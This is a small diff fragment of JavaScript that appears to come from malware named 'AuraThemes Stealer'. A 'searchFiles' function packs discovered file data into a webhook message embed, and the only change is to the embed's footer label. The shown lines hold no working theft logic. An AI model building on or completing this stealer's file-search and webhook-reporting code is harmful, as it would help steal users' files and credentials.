@@ -67,7 +67,7 @@ function searchFiles(dir, webhook) {
                                                 description: `\`\`\`yml\n${data.length === 0 ? 'Not found' : data}\n\`\`\``,
                                                 timestamp: new Date(),
                                                 footer: {
-                                                    text: 'AuraThemes Stealer | Injection',
+                                                    text: 'AuraThemes Stealer',
                                                     icon_url: 'https://i.imgur.com/yVnOSeS.gif'
                                                 }
                                             }
